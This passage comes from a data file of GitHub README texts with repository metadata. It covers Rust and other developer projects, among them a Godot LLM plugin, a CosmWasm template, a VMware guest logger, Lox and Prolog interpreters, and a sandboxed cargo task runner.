touch $TELEVISION_CONFIG/config.toml
```

#### Default Configuration
The default configuration file can be found in the repository's [./.config/config.toml](./.config/config.toml).

## Contributions

Contributions, issues and pull requests are welcome.

See [CONTRIBUTING.md](CONTRIBUTING.md) and [good first issues](https://github.com/alexpasmantier/television/issues?q=is%3Aopen+is%3Aissue+label%3A%22good+first+issue%22) for more information.
",11,7,4,MIT,"cd.yml,changelog.yml,ci.yml,update_readme.yml",65.0
WGL-2024/WGL_repo_2024,main,"# wg_repo_2024

## Contributing
Please read [CONTRIBUTE.md](CONTRIBUTE.md)

## Usage
_Cargo.toml_
```toml
[dependencies]
wg_2024 = { git = ""https://github.com/WGL-2024/WGL_repo_2024.git"", features = [""serialize""] }
```
if you don't want serde remove the features attribute

Note that this repo is unstable and due to the volume of PR there will be a lot of breaking changes.  Thus it's important to update this dependency frequently. Cargo does not auto-update the dependencies
> Once a `git` dependency has been added, Cargo will lock that dependency to the latest commit at the time. New commits will not be pulled down automatically once the lock is in place. However, they can be pulled down manually with `cargo update`.

To get the latest commit in your projects make sure you run `cargo update`
",0,8,5,,"clippy.yml,rust-fmt.yml,test.yml",78.0
nobodywho-ooo/nobodywho,main,"![Nobody Who](./assets/banner.png)

[![Matrix](https://img.shields.io/matrix/nobodywho:matrix.org?logo=matrix&style=flat-square)](https://matrix.to/#/#nobodywho:matrix.org)
[![Discord](https://img.shields.io/discord/1308812521456799765?logo=discord&style=flat-square)](https://discord.gg/qhaMc2qCYB)
[![Mastodon](https://img.shields.io/badge/Mastodon-6364FF?logo=mastodon&logoColor=fff&style=flat-square)](https://mastodon.gamedev.place/@nobodywho)

NobodyWho is a plugin for the Godot game engine that lets you interact with local LLMs for interactive storytelling.


## How to Install

You can install it from inside the Godot editor: In Godot 4.3+, go to AssetLib and search for ""NobodyWho"".

...or you can grab a specific version from our [github releases page.](https://github.com/nobodywho-ooo/nobodywho/releases) You can install these zip files by going to the ""AssetLib"" tab in Godot and selecting ""Import"".


## Getting started

The plugin does not include a large language model (LLM). You need to provide an LLM in the GGUF file format. A good place to start is something like [Gemma 2 9B](https://huggingface.co/bartowski/gemma-2-9b-it-GGUF/resolve/main/gemma-2-9b-it-Q4_K_M.gguf)

Once you have a GGUF model file, you can add a `NobodyWhoModel` node to your Godot scene. On this node, set the model file to the GGUF model you just downloaded.

`NobodyWhoModel` contains the weights of the model. The model takes up a lot of RAM, and can take a little while to initialize, so if you plan on having several characters/conversations, it's a big advantage to point to the same `NobodyWhoModel` node.

Now you can add a `NobodyWhoPromptChat` node to your scene. From the node inspector, set the ""Model Node"" field, to show this chat node where to find the `NobodyWhoModel`.
Also in the inspector, you can provide a prompt, which gives the LLM instructions on how to carry out the chat.

Now you can add a script to the `NobodyWhoPromptChat` node, to provide your chat interaction.

`NobodyWhoPromptChat` uses this programming interface:
    - `run()`: a function that starts the LLM worker. Must be called before doing anything else.
    - `say(text)`: a function that can be used to send text from the user to the LLM.
    - `completion_updated(text)`: a signal with a string parameter, that is emitted every time the LLM produces more text. Contains roughly one word per invocation.
    - `completion_finished()`: a signal which indicates that the LLM is done speaking.


## Example `NobodyWhoPromptChat` script

```gdscript
extends NobodyWhoPromptChat

func _ready():
    # initializes the LLM worker
    run()

func user_sent_some_text(text):
    # call this function whenever the user submits some new text
    # for example when hitting ""enter"" in a text input or something like that
    say(text)
    disable_user_input()

func _on_completion_updated(text):
    # attach the completion_updated signal to this function
    # it will be called every time the LLM produces some new text
    show_new_text_on_screen(text)

func _on_completion_finished():
    # attach the completion_finished signal to this function
    # it will be called when the LLM is done producing new text
    enable_user_input()

func show_new_text_on_screen(text):
    # ...omitted. Write your own chat ui code here.

func enable_user_input():
    # ...omitted. Write your own chat ui code here.

func disable_user_input():
    # ...omitted. Write your own chat ui code here.

```
",5,5,36,EUPL-1.2,main.yml,32.0
oxmmty/raffle_contract,main,"# CosmWasm Starter Pack

This is a template to build smart contracts in Rust to run inside a
[Cosmos SDK](https://github.com/cosmos/cosmos-sdk) module on all chains that enable it.
To understand the framework better, please read the overview in the
[cosmwasm repo](https://github.com/CosmWasm/cosmwasm/blob/master/README.md),
and dig into the [cosmwasm docs](https://www.cosmwasm.com).
This assumes you understand the theory and just want to get coding.

## Creating a new repo from template

Assuming you have a recent version of rust and cargo (v1.58.1+) installed
(via [rustup](https://rustup.rs/)),
then the following should get you a new repo to start a contract:

Install [cargo-generate](https://github.com/ashleygwilliams/cargo-generate) and cargo-run-script.
Unless you did that before, run this line now:

```sh
cargo install cargo-generate --features vendored-openssl
cargo install cargo-run-script
```

Now, use it to create your new contract.
Go to the folder in which you want to place it and run:


**Latest: 1.0.0-beta6**

```sh
cargo generate --git https://github.com/CosmWasm/cw-template.git --name PROJECT_NAME
````

**Older Version**

Pass version as branch flag:

```sh
cargo generate --git https://github.com/CosmWasm/cw-template.git --branch <version> --name PROJECT_NAME
````

Example:

```sh
cargo generate --git https://github.com/CosmWasm/cw-template.git --branch 0.16 --name PROJECT_NAME
```

You will now have a new folder called `PROJECT_NAME` (I hope you changed that to something else)
containing a simple working contract and build system that you can customize.

## Create a Repo

After generating, you have a initialized local git repo, but no commits, and no remote.
Go to a server (eg. github) and create a new upstream repo (called `YOUR-GIT-URL` below).
Then run the following:

```sh
# this is needed to create a valid Cargo.lock file (see below)
cargo check
git branch -M main
git add .
git commit -m 'Initial Commit'
git remote add origin YOUR-GIT-URL
git push -u origin main
```

## CI Support

We have template configurations for both [GitHub Actions](.github/workflows/Basic.yml)
and [Circle CI](.circleci/config.yml) in the generated project, so you can
get up and running with CI right away.

One note is that the CI runs all `cargo` commands
with `--locked` to ensure it uses the exact same versions as you have locally. This also means
you must have an up-to-date `Cargo.lock` file, which is not auto-generated.
The first time you set up the project (or after adding any dep), you should ensure the
`Cargo.lock` file is updated, so the CI will test properly. This can be done simply by
running `cargo check` or `cargo unit-test`.

## Using your project

Once you have your custom repo, you should check out [Developing](./Developing.md) to explain
more on how to run tests and develop code. Or go through the
[online tutorial](https://docs.cosmwasm.com/) to get a better feel
of how to develop.

[Publishing](./Publishing.md) contains useful information on how to publish your contract
to the world, once you are ready to deploy it on a running blockchain. And
[Importing](./Importing.md) contains information about pulling in other contracts or crates
that have been published.

Please replace this README file with information about your specific project. You can keep
the `Developing.md` and `Publishing.md` files as useful referenced, but please set some
proper description in the README.

## Gitpod integration

[Gitpod](https://www.gitpod.io/) container-based development platform will be enabled on your project by default.

Workspace contains:
 - **rust**: for builds
 - [wasmd](https://github.com/CosmWasm/wasmd): for local node setup and client
 - **jq**: shell JSON manipulation tool

Follow [Gitpod Getting Started](https://www.gitpod.io/docs/getting-started) and launch your workspace.

",0,7,2,Apache-2.0,Basic.yml,63.0
Azvanzed/vmw-logger-rs,main,"# vmw-logger-rs
A VMware logger rust crate that leverages an undocumented built-in backdoor for guest-host interaction with no_std support.

### How to enable
To enable this functionality, add the following lines to the *.VMX file:
```
replay.enableBackdoorPutChar = ""TRUE""
log.guestThrottleBytesPerSec = ""100000000""
log.throttleBytesPerSec = ""100000000""
log.append = ""FALSE""
log.keep = ""FALSE""
```

### Credits
- jessie (intege_rs)
- YushiOMOTE
",0,0,1,MIT,,0.0
devongovett/analyze-npm,main,"# analyze-npm

A program to analyze the syntax used by top npm packages. This uses the list of top package collected by [LeoDog896/npm-rank](https://github.com/LeoDog896/npm-rank/tree/main), and analyzes whether they use ESM or CommonJS, whether their CommonJS exports and requires are statically analyzable, etc.

## How to run

1. Run `node install.js` to generate the package.json with dependencies to install.
2. Run a package manager like `npm`. I used `bun install`.
3. Run `cargo run --release` to run the analysis. There may be a few errors for things that couldn't be parsed.

## Results

As of 2024-09-22, these are the results:

* Packages analyzed: 9800
* Total files: 101032
* Files with ESM: 51751
* Files with dynamic import: 276
* Files with CommonJS: 49139
* Files with non-static exports: 20370
* Files with non-static requires: 360
* Errors: 15
",0,0,1,MIT,,0.0
danilowhk/swiftness-sp1,main,"# SP1 Project Template

This is a template for creating an end-to-end [SP1](https://github.com/succinctlabs/sp1) project
that can generate a proof of any RISC-V program.

## Requirements

- [Rust](https://rustup.rs/)
- [SP1](https://docs.succinct.xyz/getting-started/install.html)

## Running the Project

There are four main ways to run this project: build a program, execute a program, generate a core proof, and
generate an EVM-compatible proof.

### Build the Program

To build the program, run the following command:

```sh
cd program
cargo prove build
```

### Execute the Program

To run the program without generating a proof:

```sh
cd script
cargo run --release -- --execute --proof ../examples/proofs/recursive/bitcoin_bootloader_proof.json
```

This will execute the program and display the output.

### Generate a Core Proof

To generate a core proof for your program:

```sh
cd script
cargo run --release -- --prove --proof ../examples/proofs/recursive/bitcoin_bootloader_proof.json
```

### Generate an EVM-Compatible Proof

> [!WARNING]
> You will need at least 128GB RAM to generate a Groth16 or PLONK proof.

To generate a proof that is small enough to be verified on-chain and verifiable by the EVM:

```sh
cd script
cargo run --release --bin evm -- --system groth16
```

this will generate a Groth16 proof. If you want to generate a PLONK proof, run the following command:

```sh
cargo run --release --bin evm -- --system plonk
```

These commands will also generate fixtures that can be used to test the verification of SP1 zkVM proofs
inside Solidity.

### Retrieve the Verification Key

To retrieve your `programVKey` for your on-chain contract, run the following command:

```sh
cargo prove vkey --elf elf/riscv32im-succinct-zkvm-elf
```

## Using the Prover Network

We highly recommend using the Succinct prover network for any non-trivial programs or benchmarking purposes. For more information, see the [setup guide](https://docs.succinct.xyz/generating-proofs/prover-network.html).

To get started, copy the example environment file:

```sh
cp .env.example .env
```

Then, set the `SP1_PROVER` environment variable to `network` and set the `SP1_PRIVATE_KEY`
environment variable to your whitelisted private key.

For example, to generate an EVM-compatible proof using the prover network, run the following
command:

```sh
SP1_PROVER=network SP1_PRIVATE_KEY=... cargo run --release --bin evm
```
# swiftness-sp1
",0,0,1,MIT,,0.0
bowbahdoe/color,main,"# color

Color library for the JVM.

Heavily based on [go-colorful](https://github.com/lucasb-eyer/go-colorful/tree/master)
by [Lucas Beyer](https://github.com/lucasb-eyer).

```xml
<dependency>
    <groupId>dev.mccue</groupId>
    <artifactId>color</artifactId>
    <version>2024.10.09.3</version>
</dependency>
```

## Status

I am still working through this and working toward actually understanding
colors, color spaces, etc.

As such I might revisit some design choices without mercy. Notably I need to zero in
on where and when is best to auto-clamp values in the different color implementations.

Keep that in mind if you want to use it for anything. You can always reach out
to me directly to make sure some particular piece of API surface is stable.

Other than that, I need to do a lot more documentation. Both javadocs and
tutorials for appropriate usage.

## Usage

You can create a color using one of the static factory methods on `Color`.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
```

And you can get the components of a color in a particular color space using matching instance methods.

```java
// RGB in 0..1
var srgb = Color.hex(""#00FF0F"").sRGB();
// RBG in 0..255
var rgb = Color.hex(""#00FF0F"").RGB255();
// HSL
var hsl = Color.hex(""#00FF0F"").HSL();
```

To blend between different colors you can use the various blend methods.
These are tailored to blending in a particular color space.

```java
var red = Color.sRGB(1, 0, 0);
var blue = Color.hex(""#0000FF"");
var purple = red.blendLuv(blue);
```

There are also utilities for generating palettes of colors
and for sorting colors by their ""distance"" to each-other.

```java
var happy = Color.happy(10);
var sorted = Color.sort(happy);
```

",6,0,1,MIT,"release.yml,test.yml",0.0
Folyd/lox-lang,main,"# lox-lang

Lox language interpreter written in Rust

## Run

```kt
fun main() {
    print ""hello world!""
}

main();
```

`cargo run example.lox`

## Test

`cargo test`

> Most of the test and benchmark files are copied from [Crafting Interpreters](https://github.com/munificent/craftinginterpreters) repository. The copyright for these belongs to Bob Nystrom and are copied here because their license allows it (MIT).

## Benchmark

![](./benchmark.svg)

### Rust (this interpreter)

```
$ python3 run_lox_benchmarks.py lox 
Running benchmarks for lox... tests/benchmarks/lox
arithmetic.lox: 2.8146
binary_trees.lox: 6.4399
equality.lox: 3.6683
fib.lox: 2.1664
instantiation.lox: 2.7269
invocation.lox: 0.8192
method_call.lox: 0.5381
properties.lox: 1.1997
trees.lox: 9.0106
zoo.lox: 0.927
```

### Python v3.12.3

```
$ python3 run_lox_benchmarks.py python
Running benchmarks for python... tests/benchmarks/python
arithmetic.py: 2.617
binary_trees.py: 2.5121
equality.py: 2.6572
fib.py: 1.3623
instantiation.py: 2.4031
invocation.py: 0.5649
method_call.py: 0.2729
properties.py: 0.9565
trees.py: 2.5539
zoo.py: 0.7307
```

### Perl v5.34.1

```
$ python3 run_lox_benchmarks.py perl  
Running benchmarks for perl... tests/benchmarks/perl
arithmetic.pl: 1.2259
binary_trees.pl: 7.158
equality.pl: 1.5235
fib.pl: 4.7082
instantiation.pl: 4.24
invocation.pl: 0.9832
method_call.pl: 1.11
properties.pl: 1.574
trees.pl: 12.1001
zoo.pl: 1.2363
```

### Clox (Crafting Interpreters)
```
$ python3 run_lox_benchmarks.py clox
Running benchmarks for clox... tests/benchmarks/lox
arithmetic.lox: 0.749
binary_trees.lox: 3.8906
equality.lox: 2.0149
fib.lox: 1.0654
instantiation.lox: 1.8701
invocation.lox: 0.2706
method_call.lox: 0.1883
properties.lox: 0.4145
trees.lox: 2.6955
zoo.lox: 0.3104
```
",0,1,1,MIT,,0.0
yoshuawuyts/cargo-task-wasm,main,"<h1 align=""center"">cargo-task-wasm</h1>
<div align=""center"">
  <strong>
    A sandboxed local task runner for Rust
  </strong>
</div>

 <br />

<div align=""center"">
  <a href=""https://crates.io/crates/cargo-task-wasm"">
    <img src=""https://img.shields.io/crates/v/cargo-task-wasm.svg?style=flat-square""
    alt=""Crates.io version"" />
  </a>
  <a href=""https://crates.io/crates/cargo-task-wasm"">
    <img src=""https://img.shields.io/crates/d/cargo-task-wasm.svg?style=flat-square""
      alt=""Download"" />
  </a>
  <a href=""https://docs.rs/cargo-task-wasm"">
    <img src=""https://img.shields.io/badge/docs-latest-blue.svg?style=flat-square""
      alt=""docs.rs docs"" />
  </a>
</div>

## About

This project provides a new `cargo task` subcommand that can be used to run
project-local tasks inside a secure WebAssembly sandbox. It looks for files in a
`tasks/` subdirectory of your project's root, and compiles those to [Wasm
Components](https://component-model.bytecodealliance.org). This is an attempt at
formalizing [cargo-xtask](https://github.com/matklad/cargo-xtask) pattern into a
first-class, secure workflow.

Supply chain attacks like the [2022 `node-ipc`
vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2022-23812) or the [2018
`event-stream`
vulnerability](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)
the danger of executing third-party scripts locally without a sandbox.
`wasmtime` and
[cargo-component](https://github.com/bytecodealliance/cargo-component) make it
possible to sandbox both local testing and remote execution of code. But most
project-local tooling is still unsandboxed. This project makes it possible to
isolate and sandbox build project-local build tools.

This project is not a complete solution, but a piece of a broader sandboxing
strategy for Rust. To fully secure local build tooling proc macros also need to
be sandboxed (e.g. via [`watt`][watt]), as well as `build.rs` scripts (no
solution exists yet). Our hope is that it will eventually be possible to sandbox
all of these, making it so an entire class of attack on the Rust ecosystem can
be prevented. This project brings us one step closer.

## Roadmap

- [x] Sketch out a repository layout or whatever workflow example
- [x] Create a new `cargo` subcommand
- [x] Hook up wasmtime to the subcommand
- [x] Add support for manual paths in a `[tasks]` section in `Cargo.toml`
- [x] Figure out how to configure capabilities for the tasks
- [x] Add support for compiling cargo deps as part of subcommands
- [x] Store config in Cargo metadata section
- [x] Add support for using submodules
- [ ] Add the remainder of the capabilities
- [ ] Add support for installing tasks from crates.io
- [ ] Support workspaces and [`[workspace.metadata]`](https://doc.rust-lang.org/cargo/reference/workspaces.html#the-metadata-table)

## Installation

The `cargo task` subcommand compiles Rust to Wasm Components targeting [WASI
0.2](https://wasi.dev). In order to do that a working WASI 0.2 toolchain needs
to be present on the host system.

```sh
$ rustup +beta target add wasip2  # Install the WASI 0.2 target
$ cargo install cargo-task-wasm   # Install the `cargo task` subcommand
```

## Usage

```text
Usage: cargo task <TASK_NAME> [ARGS]...

Arguments:
  <TASK_NAME>  The name of the task to run
  [ARGS]...    Optional arguments to pass to the task

Options:
  -h, --help     Print help
  -V, --version  Print version

Examples:
  cargo task codegen     # run a task called `codegen`
```

## Configuration

### Capabilities

Tasks in `cargo task` follow the [principle of least
privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege). By
default they only get access to the working directory, and can access any
additional command line arguments passed to it. Additional permissions can be
configured via a `[package.metadata.tasks]` section in `Cargo.toml`.

```toml
[package]
name = ""example""
version = ""0.1.0""
edition = ""2021""

[package.metadata.tasks]
env-filter = { inherit-env = [""FOO""] }  # inherit specific env vars
env-all = { inherit-env = true }        # inherit all env vars
```

The reason why this is stored in `[package.metadata.tasks]` rather than a
top-level `[tasks]` section is because that is [the canonical extension
point](https://doc.rust-lang.org/cargo/reference/manifest.html#the-metadata-table)
Cargo recommends using for third-party extensions. Should a `cargo tasks`
command ever become a first-class extension to Cargo, the `package.metadata`
prefix can be dropped.

### Dependencies

Tasks must specify their own dependencies via
`[package.metadata.task-dependencies]` in `Cargo.toml`. These dependencies are
separate from Cargo's existing `[dev-dependencies]` and `[build-dependencies]`
because these dependencies must be able to be compiled to Rust's `wasm32-wasip2`
target. Not all dev or build deps may fit these requirements, which is why task
dependencies are listed separately.

```toml
[package]
name = ""example""
version = ""0.1.0""
edition = ""2021""

[package.metadata.task-dependencies]
wstd = ""0.4.0""
```

### Paths

Tasks are discovered in the local `tasks/` directory of your project. This is a
treated as standalone workspace where each file is treated as an individual task
to be compiled and executed. This behaves not unlike the `tests/` directory in
Cargo projects. It is possible to use both submodules and dependencies with
tasks like you would expect. A typical project structure will look like this:

```text
example/
‚îú‚îÄ‚îÄ Cargo.toml
‚îú‚îÄ‚îÄ src
‚îÇ   ‚îî‚îÄ‚îÄ lib.rs
‚îî‚îÄ‚îÄ tasks
    ‚îú‚îÄ‚îÄ codegen.rs
    ‚îî‚îÄ‚îÄ test.rs
```

This structure will give you access to the `cargo task codegen` and `cargo task
test` subcommands.

## Limitations

By default tasks only get access to the local project directory and any
additional arguments passed via the CLI. Additional capabilities such as network
or filesystem access can be configured via `Cargo.toml`. Sandboxing is provided
by the Wasmtime runtime, and the available APIs are part of the
`wasi:cli/command` world. Some limitations however still exist, and are good to
be aware of:

- **Limited ecosystem support**: At the time of writing WASI 0.2 is a fairly new
compile target, and so ecoystem support is still in its infancy. Not all crates
are expected to work, and may need to be updated first.
- **Limited stdlib support**: For similar reasons: not all functionality in the
stdlib will work yet. In particular network support for WASI 0.2 is still being
implemented. This is expected to land in Rust 1.84 in the second half of 2024.
If you want to access the network before then, you can try and use the
[wasi](https://docs.rs/wasi) or [wstd](https://docs.rs/wstd) crates.
- **No threading support**: At the time of writing support for threading in WASI
0.2 has not yet been implemented. Work on this is still ongoing upstream in the
WASI subgroup. Consensus on a design seems to have formed, and implementation
work has started - but this is unlikely to stabilize before the start of 2025.
- **No support for exec/fork**: WASI 0.2 does not allow you to spawn or fork new
processes. Providing access to this would be a sandbox escape, and so we don't
provide access to it. This means it's not possible to shell out to call global
tools, which may at times be impractical but is also a necessary limitation to
guarantee security.

In the future we hope to provide a way to instrument Cargo or Rustc directly
from inside the sandbox. However this will need to be carefully evaluated and
designed to ensure the sandbox cannot be escaped.

## See Also

- [Custom tasks in Cargo (Aaron Turon, 2018)](http://aturon.github.io/tech/2018/04/05/workflows/) - First proposed a `cargo task` subcommand for custom tasks.
- [`matklad/cargo-xtask` (Alex Kladov, 2019)](https://github.com/matklad/cargo-xtask) - A convention-based implementation of `cargo task`.
- [`dtolnay/watt` (David Tolnay 2019)][watt] - Executing Rust procedural macros compiled as WebAssembly.

## Safety
This crate uses ``#![deny(unsafe_code)]`` to ensure everything is implemented in
100% Safe Rust.

## Contributing
Want to join us? Check out our [""Contributing"" guide][contributing] and take a
look at some of these issues:

- [Issues labeled ""good first issue""][good-first-issue]
- [Issues labeled ""help wanted""][help-wanted]

[contributing]: https://github.com/yoshuawuyts/cargo-task-wasm/blob/master.github/CONTRIBUTING.md
[good-first-issue]: https://github.com/yoshuawuyts/cargo-task-wasm/labels/good%20first%20issue
[help-wanted]: https://github.com/yoshuawuyts/cargo-task-wasm/labels/help%20wanted

## Acknowledgements

This project was built as a collaboration between [Michael
Woerister](https://github.com/michaelwoerister) and [Yosh
Wuyts](https://github.com/yoshuawuyts) as part of the 2024 Microsoft Hackathon,
targeting the [Microsoft Secure Future
Initiative](https://www.microsoft.com/en-us/microsoft-cloud/resources/secure-future-initiative).
Special thanks to [Pat Hickey](https://github.com/pchickey) for showing us how
to configure Wasmtime as a Rust library.

## License

<sup>
Licensed under either of <a href=""LICENSE-APACHE"">Apache License, Version
2.0</a> or <a href=""LICENSE-MIT"">MIT license</a> at your option.
</sup>

<br/>

<sub>
Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this crate by you, as defined in the Apache-2.0 license, shall
be dual licensed as above, without any additional terms or conditions.
</sub>

[watt]: https://github.com/dtolnay/watt
",0,2,1,Apache-2.0,ci.yaml,0.0
twolodzko/prolog-rs,main,"# Prolog.rs

This is a minimal Prolog interpreter implemented in Rust.
The implementation covers only a subset of Prolog features,
is not intended to be fast, or optimal in any sense.
It is a learning project that helped me to understand Prolog better.

The implementation is tested using 350+ unit tests, including
running some code solutions for the [""99 Prolog problems""],
and unit tests checking for ISO Prolog consistency. There are
some differences from other Prolog implementations though,
as described [below](#limitations-and-differences-from-other-implementations).

If you are looking for a mature Prolog implementation in Rust, 
check rather the [Scryer](https://www.scryer.pl/) Prolog.

## Usage

To run the Prolog interpreter you can use the [Justfile] commands:

```shell
$ just test      # runs tests
$ just build     # builds the standalone binary ./prolog
$ just run FILE  # evaluate the FILE and start REPL
$ just repl      # start REPL
```

To install it, move the `prolog` binary together with the `lib/` directory to some
directory of your choice.

Calling `./prolog -e FILE` from the command line would evaluate the *FILE*, run
the `main/0` goal (if available), and exit.

## Data types

The units of data in Prolog are called *terms*.

* Atoms are name-only datatypes, for example, `foo`.
  Their names need to start with a lowercase letter.
* Integers are the only supported numerical type.
* Variables have no specific value, but they can be initialized
  with a value during unification (see below). Their names
  need to start with uppercase letters or `_`.
* There exist also compound terms:
  * Structures like `foo(a, b)` have name `foo` and
    arguments (`c` and `b`).
  * Lists like `[1, 2, 3]` can contain multiple terms.

In Prolog everything is a struct, so atom `foo` is the same as `foo()`, operation like
`2 + 2` is `+(2, 2)`, the ""and"" operator in `a , b` is `,(a, b)`
(don't be confused with the comma separating the arguments), etc.

Lists in Prolog are also structs, so `[1, 2, 3]` is represented as `.(1, .(2, .(3, [])))`, where
`[]` stands for an empty list. Prolog allows you to create dotted pairs (in [lisp] terms), for example
`[1 | 2]` is represented as `.(1, 2)`.

There are no booleans. Terms are evaluated by unification. The term `fail` always fails the unification.

```prolog
?- 1=1.
yes
?- \+ 1=1.
no
?- fail.
no
?- \+ fail.
yes
```

## Facts, rules, and questions

Prolog programs are defined in terms of three kinds of expressions:

* Facts, like `foo.` or `bar(a,b,32).` state what is ""true"".
* Rules, like `mortal(Who) :- person(Who).` define logical implications.
* Questions, like `?- mortal(socrates).` validate if the question is true.

A very simple Prolog program may solve the classical logical question:

```prolog
% fact
person(socrates).

% rule
mortal(Who) :-
    person(Who).

% question
?- mortal(socrates).
```

## Unification

Prolog extensively uses pattern matching. When you ask a *question*, it searches its
database if any of the recorded *facts* and *rules* that match the goals in the question.
This is nicely explained in the *[Adventure in Prolog]* book by Dennis Merritt:

> Prolog's pattern matching is called **unification**. In the case where the logicbase
> contains only facts, unification succeeds if the following three conditions hold.
>
> * The predicate named in the goal and logicbase are the same.
> * Both predicates have the same arity.
> * All of the arguments are the same.

When variable is unified with the value, the variable becomes equivalent to the value.
If two free variables are unified, they become each other's aliases.

There are also procedures using special evaluation rules instead of unification, for example:

```prolog
?- X is 1+2.
X = 3
?- 1+2 < 5.
yes
?- writeln('hello, world!').
hello, world!
yes
```

## Features

By design, this interpreter covers only a subset of Prolog's features. Those include:

* `fail` is a goal that always fails.
* `a , b` means that we want to satisfy both *a* and *b*, while `a ; b` means *a* or *b*.
* `\+` can be used to negate a goal.
* `!` is the [cut operator]. It prevents backtracking for the goals preceding it.
* `->` is the if-else operator, `Cond -> Then` tries to satisfy `Cond`, if it succeeds,
  then attempts to satisfy `Then`, otherwise it fails. Underneath, it is a syntactic
  sugar for expressing `Cond, !, Then`.
* `=` is a unification operator, it is equivalent to `=(A, A)`.
* `_` is a wildcard variable that unifies with anything but never holds any value.
* `is` operator, as in `X is 2 + 2`, evaluates the right-hand-side and if left-hand-side is
  a free variable, assigns the result to it, otherwise compares the result to it's value
  (so `4 is 2 + 2` evaluates to ""yes"").
* The supported mathematical operators and functions are:
  * unary operators `+`, `-`,
  * binary operators `+`, `-`, `*`, `/`, `//` (last two are synonyms), and `rem`,
  * `div` and `mod` (using [`i32::div_euclid`][i32] and [`i32::rem_euclid`][i32]),
  * `abs` and `sign` functions.

  Those operators can be used together with procedures with special evaluation rules
  like `is`, `=:=`, `<`, etc. Outside of those procedures, they will create structs,
  for example `2 + 3` would become `+(2,3)`.
* `=:=`, `<` are the numerical comparison operators that evaluate both sides
  and compare them, e.g. `2 + 1 < 7 - 2`.
  The operators `=\=`, `=<`, `>`, `>=` are available through `lib/stdlib.pl`.
* `==`, `@<` are comparison operators checking the [standard order of terms]
  (see [below](#limitations-and-differences-from-other-implementations)).
  The operators `\==`, `@=<`, `@>`, `@>=` are available through `lib/stdlib.pl`.
* `consult('path/to/file.pl')` loads and evaluates the file. If the file contains a question (`?-`)
  which cannot be satisfied, it will fail with an error. It takes as an argument an atom with
  path to the file, or a list of such atoms.
* `write(X)` prints *X* and `nl` prints a newline.
* The `trace` and `untrace` commands can be used to turn the tracing logging on and off.
* `{a, b, c}` is a syntactic sugar for writing `{}(,(a, ,(b, c)))`. It has no special meaning.
* `atom(X)`, `integer(X)`, `number(X)` are type checkers. `var(X)` checks if *X* is a free variable.

More functionalities are implemented in the standard library available through `lib/stdlib.pl`.

## Limitations and differences from other implementations

* Only a subset of Prolog's functionalities are implemented. Features such as strings or floats types, DCG's, defining
  custom operators, etc are not available.
* The precedence of `;` and `,` operators is reversed, so `a , b ; c, d` is parsed the same as `a , (b ; c) , d`.
  Use brackets to assure the correct precedence.
* In quoted atom names only a subset of escape characters are allowed, including: `\n`, `\t`, `\s`, `\\`, `\'`. `\""`,
  or `\NEWLINE`.
* Under the [standard order of terms] variables should be sorted by their memory addresses. Since in this
  implementation variables don't get memory addresses until they are initialized, such ordering is not possible.
* In Prolog `,/2` is an operator such that `a , b` tries to satisfy `a` and `b`. In this implementation instead
  of using linked lists, structs are based on Rust `Vec`'s of any size, so `a , b , c` would become `,(a, b, c)`
  rather than `,(a, ,(b, c))`.
* Arithmetic `div` and `mod` use [Rust's `i32::div_euclid` and `i32::rem_euclid`][i32] which are defined
  [differently to Prolog][swipl-div], but meet the requirement of being consistent with each other.
* Since `_` does not bind, the query like `?- L = [_, _], L = [1, _], L = [2, _]` would give a logically inconsistent
  answer ""yes"". The same query would work correctly in SWI Prolog, but not in Tau prolog
  (e.g. [prolog.run](https://prolog.run/)).
* The implementation is not tail-call optimized, so can easily overflow when satisfying complex goals.
* Tracing is simplified and limited as compared to the other implementations.


[antlr]: https://github.com/antlr/grammars-v4/blob/master/prolog/prolog.g4
[Adventure in Prolog]: https://www.amzi.com/AdventureInProlog/index.php
[standard order of terms]: https://www.swi-prolog.org/pldoc/man?section=standardorder
[cut operator]: https://pages.cs.wisc.edu/~fischer/cs538.s02/prolog/A13CUT.HTM
[i32]: https://doc.rust-lang.org/std/primitive.i32.html
[lisp]: https://web.mit.edu/scheme_v9.2/doc/mit-scheme-ref/Lists.html#Lists
[""99 Prolog problems""]: https://www.ic.unicamp.br/~meidanis/courses/mc336/2009s2/prolog/problemas/
[swipl-div]: https://www.swi-prolog.org/pldoc/man?function=div%2f2
[Justfile]: https://github.com/casey/just
",0,0,2,,,0.0
zheland/try-specialize,master,"# try-specialize

[![Build Status](https://github.com/zheland/try-specialize/workflows/build/badge.svg)](https://github.com/zheland/try-specialize/actions)
[![Latest Version](https://img.shields.io/crates/v/try-specialize.svg)](https://crates.io/crates/try-specialize)
[![Documentation](https://docs.rs/try-specialize/badge.svg)](https://docs.rs/try-specialize)
[![Codecov](https://codecov.io/gh/zheland/try-specialize/graph/badge.svg)](https://codecov.io/gh/zheland/try-specialize)
[![Dependencies status](https://deps.rs/repo/github/zheland/try-specialize/status.svg)](https://deps.rs/repo/github/zheland/try-specialize)
[![Downloads](https://img.shields.io/crates/d/try-specialize)](https://crates.io/crates/try-specialize)
[![License](https://img.shields.io/crates/l/try-specialize)](https://github.com/zheland/try-specialize/#license)
[![MSRV 1.81+](https://img.shields.io/badge/rustc-1.81+-blue.svg)](https://blog.rust-lang.org/2024/09/05/Rust-1.81.0.html)

The `try-specialize` crate provides limited, [zero-cost](#zero-cost)
specialization in generic context on stable Rust.

```rust
use try_specialize::TrySpecialize;

fn example_specialize_by_value<T>(value: T) -> Result<u32, T> {
    value.try_specialize()
}

fn example_specialize_by_ref<T: ?Sized>(value: &T) -> Option<&str> {
    value.try_specialize_ref()
}
```

## Introduction

While specialization in Rust can be a tempting solution in many use cases,
it is usually more idiomatic to use traits instead. Traits are the idiomatic
way to achieve polymorphism in Rust, promoting better code clarity,
reusability, and maintainability.

However, specialization can be suitable when you need to optimize
performance by providing specialized implementations for some types without
altering the code logic. It's also useful in specific, type-level
programming use cases like comparisons between types from different
libraries.

For a simple use cases, consider the [`castaway`] crate, which offers a much
simpler API. On nightly Rust, consider using [`min_specialization`] feature
instead. The Rust standard library already uses [`min_specialization`] for
many optimizations. For a more detailed comparison, see the
[Alternative crates](#alternative-crates) section below.

## About

This crate offers a comprehensive API for addressing various specialization
challenges, reducing the need for unsafe code. It provides specialization
from unconstrained types, to unconstrained types, between 'static types,
and between type references and mutable references, and more.

